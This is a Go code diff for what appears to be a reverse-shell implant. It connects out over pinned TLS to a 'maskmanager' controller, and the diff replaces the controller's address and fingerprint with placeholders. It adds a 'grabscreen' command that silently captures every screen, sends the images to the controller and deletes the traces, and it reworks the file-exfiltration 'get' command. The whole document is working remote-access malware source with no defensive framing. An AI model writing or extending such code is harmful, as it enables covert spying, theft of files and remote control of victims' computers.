@@ -6,6 +6,7 @@ import (
 	"crypto/tls"
 	"encoding/hex"
 	"fmt"
+	"image/png"
 	"io"
 	"net"
 	"os"
@@ -14,19 +15,21 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
+
+	"github.com/kbinani/screenshot"
 )
 
 //BUFFSIZE is the buffer for communication
 const BUFFSIZE = 512
 
 //MASKMANAGERIP connection string to the maskmanager
-const MASKMANAGERIP = "192.168.225.72:4443"
+const MASKMANAGERIP = "IPPORT"
 
 //PINNEDFPRINT fingerprint pinning to escape from MITM
-const PINNEDFPRINT = `E8:B5:0F:9F:F3:09:E7:A3:54:92:BC:B7:D9:A6:41:23:93:68:5F:75:B5:BF:08:70:54:15:7B:A1:01:7D:1E:1D`
+const PINNEDKEY = `FPRINT`
 
 func main() {
-	fingerprint := strings.Replace(PINNEDFPRINT, ":", "", -1)
+	fingerprint := strings.Replace(PINNEDKEY, ":", "", -1)
 	fingerprintbytes, err := hex.DecodeString(fingerprint)
 	if err != nil {
 		fmt.Println(err)
@@ -58,6 +61,35 @@ func pinnedcertcheck(conn *tls.Conn, pinnedcert []byte) bool {
 	return certmatched
 }
 
+func getscreenshot() []string {
+	n := screenshot.NumActiveDisplays()
+	filenames := []string{}
+	var fpth string
+	for i := 0; i < n; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			panic(err)
+		}
+		if runtime.GOOS == "windows" {
+			fpth = `C:\Windows\Temp\`
+		} else {
+			fpth = `/tmp/`
+		}
+		fileName := fmt.Sprintf("maskScr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
+		fullpath := fpth + fileName
+		filenames = append(filenames, fullpath)
+		file, _ := os.Create(fullpath)
+
+		defer file.Close()
+		png.Encode(file, img)
+
+		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
+	}
+	return filenames
+}
+
 func getmaskedshell(conn *tls.Conn) {
 	var cmdbuff []byte
 	var command string
@@ -74,7 +106,20 @@ func getmaskedshell(conn *tls.Conn) {
 		} else if strings.Index(command, "get") == 0 {
 			fname := strings.Split(command, " ")[1]
 			fmt.Println(fname)
-			go sendFile(conn, fname)
+			finflag := make(chan string)
+			go sendFile(conn, fname, finflag)
+			//<-finflag
+
+		} else if strings.Index(command, "grabscreen") == 0 {
+			filenames := getscreenshot()
+			finflag := make(chan string)
+			for _, fname := range filenames {
+				go sendFile(conn, fname, finflag)
+				<-finflag
+				go removetempimages(filenames, finflag)
+				//<-finflag
+
+			}
 
 		} else {
 			//endcmd := "END"
@@ -128,7 +173,13 @@ func getmaskedshell(conn *tls.Conn) {
 	}
 }
 
-func sendFile(revConn net.Conn, fname string) {
+func removetempimages(filenames []string, finflag chan string) {
+	for _, name := range filenames {
+		os.Remove(name)
+	}
+}
+
+func sendFile(revConn net.Conn, fname string, finflag chan string) {
 
 	file, _ := os.Open(strings.TrimSpace(fname))
 	fileInfo, err := file.Stat()
@@ -150,6 +201,8 @@ func sendFile(revConn net.Conn, fname string) {
 		}
 		revConn.Write(sendBuffer)
 	}
+	finflag <- "file sent"
+
 	//Completed file sending
 	return
 }
